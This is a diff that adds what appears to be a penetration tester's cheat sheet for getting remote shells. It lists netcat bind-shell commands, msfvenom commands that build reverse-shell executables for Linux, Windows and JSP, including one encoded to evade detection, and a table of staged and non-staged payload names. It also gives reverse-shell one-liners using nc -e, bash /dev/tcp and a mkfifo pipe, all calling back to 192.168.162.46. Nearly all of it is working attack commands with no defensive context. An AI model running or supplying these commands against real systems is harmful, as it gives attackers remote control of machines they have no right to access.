@@ -1,0 +1,28 @@
+Bind
+nc -nlvp 443 -e cmd.exe    ..Windows: Share cmd (to anyone)
+nc -nv 10.x.x.x 443        ..Linux: Connect to remote cmd
+
+msfvenom -p linux/x64/shell/reverse_tcp LHOST=192.168.162.46 LPORT=4443 -f elf > shell
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.162.46 LPORT=443 -f exe > shell.exe
+msfvenom -p windows/shell/reverse_tcp LHOST=192.168.162.46 LPORT=443 -f exe > shell.exe
+msfvenom -p windows/shell_reverse_tcp LHOST=192.168.162.46 LPORT=443 -e x86/shikata_ga_nai -f exe -o shellenc.exe
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.162.46 LPORT=443 -f raw > venomshell.jsp 
+
+windows/shell/reverse_tcp                 ..staged
+windows/shell_reverse_tcp                 ..non-staged
+windows/x64/shell_reverse_tcp             ..staged
+linux/x86/shell/reverse_tcp               ..linux 32bit staged
+linux/x86/shell_reverse_tcp               ..non-staged
+linux/x64/shell/reverse_tcp               ..staged
+
+php
+/home/boss/tools/privesc_windows/windows-php-reverse-shell.php
+
+Reverse
+nc -nv 192.168.162.46 443 -e /bin/bash
+/bin/nc -e /bin/bash 192.168.162.46 80
+netcat -e /bin/bash 192.168.162.46 443
+bash -i >& /dev/tcp/192.168.162.46/443 0>&1
+
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.162.46 443 > /tmp/f
+
